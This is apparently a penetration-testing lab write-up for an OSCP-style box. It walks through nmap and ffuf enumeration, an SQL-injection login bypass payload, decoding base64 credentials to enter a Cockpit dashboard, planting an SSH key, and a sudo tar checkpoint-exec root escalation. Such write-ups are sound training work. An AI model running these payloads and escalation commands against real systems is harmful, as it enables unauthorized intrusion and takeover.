`nmap -A -T4 -p- 192.168.152.10`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.152.10:9090/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


First thing that stuck out was the CockPit service on 9090

![](Images/Pasted%20image%2020250504140528.png)
Lets go ahead and try some of these. Looks like we can get code execution. That appears to be a rabbit hole after trying some of them.

Lets do some further enumeration of port 80

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.10:80/FUZZ
```

That finds some directories to work with

![](Images/Pasted%20image%2020250504141515.png)

Lets Fuzz some web technologies as we need to find our index as nothing is configured for the root page.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://192.168.152.10:80/indexFUZZ
```

That got us index.html but it doesn't work. Lets see if we can change our directory enum to look for files.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.10:80/FUZZ.php
```

![](Images/Pasted%20image%2020250504142101.png)

That finds something that we can check.

![](Images/Pasted%20image%2020250504142326.png)

Lets test some basic creds along with potential injections.

We got SQLi

![](Images/Pasted%20image%2020250504142424.png)

Testing basic bypass got us the following

![](Images/Pasted%20image%2020250504142550.png)

So I am unsure if we are supposed to move forward with this. Lets try intruder anyways to fuzz for SQLi

After doing multiple scans using intruder we got a successful payload `'OR '' = '` to login without a valid user.

![](Images/Pasted%20image%2020250504143347.png)

```
james 	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron 	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

Decoding those gets

```
Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI= - canttouchhhthiss@455152
dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy - thisscanttbetouchedd@455152
```

Smashing those credentials in the other login page we found on port 9090 gets us auth as `james:canttouchhhthiss@455152`

Within the dashboard it contains a shell interface and we can grab the local flag.

![](Images/Pasted%20image%2020250504143735.png)

Lets see if we can get ourselves a normal shell or ssh. Since per the rules of the OSCP this would not count.

![](Images/Pasted%20image%2020250504144006.png)

We can add a SSH key, so lets generate one and try it.

```
ssh-keygen -t RSA -f id_rsa

cat id_rsa.pub
```

![](Images/Pasted%20image%2020250504144140.png)

Lets try to SSH using this key now. `ssh james@192.168.152.10 -i id_rsa`

![](Images/Pasted%20image%2020250504144227.png)

We get authentication. Lets move on to escalation.


# Post Exploitation
Transfer Linpeas right on over.

First thing of note `Vulnerable to CVE-2021-3560`

![](Images/Pasted%20image%2020250504144430.png)

Privilege Escalation via Tar Bash Script (WildCards)

`sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh`

![](Images/Pasted%20image%2020250504145551.png)



